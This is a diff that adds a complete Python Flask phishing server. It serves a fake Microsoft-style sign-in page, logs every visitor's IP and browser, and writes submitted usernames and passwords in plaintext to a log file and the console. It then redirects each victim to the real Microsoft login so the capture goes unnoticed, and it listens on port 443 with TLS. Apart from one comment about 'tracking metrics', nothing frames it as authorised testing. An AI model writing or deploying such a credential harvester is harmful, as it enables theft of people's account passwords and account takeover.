@@ -1,0 +1,44 @@
+# capture_server.py
+from flask import Flask, request, redirect
+import datetime, os
+
+app = Flask(__name__)
+LOG = "captured.log"
+REAL_LOGIN = "https://login.microsoftonline.com/"  # redirect target after capture
+
+HTML = """<!DOCTYPE html>
+<html>
+<head><title>Sign in to your account</title><link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <form method="POST" action="/login">
+    <h2>Sign in</h2>
+    <input type="email" name="username" placeholder="Email" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Sign in</button>
+  </form>
+<script src="script.js"></script>
+</body>
+</html>"""
+
+@app.route("/")
+def index():
+    # Log every click (for your tracking metrics)
+    log(request.remote_addr, "CLICK", request.headers.get("User-Agent", ""))
+    return HTML
+
+@app.route("/login", methods=["POST"])
+def login():
+    user = request.form.get("username", "")
+    pwd  = request.form.get("password", "")
+    log(request.remote_addr, f"CREDS user={user} pass={pwd}")
+    return redirect(REAL_LOGIN)  # send them to the real site after capture
+
+def log(ip, event, extra=""):
+    line = f"[{datetime.datetime.now()}] {ip} | {event} | {extra}"
+    with open(LOG, "a") as f:
+        f.write(line + "\n")
+    print(line)  # also see it live
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))
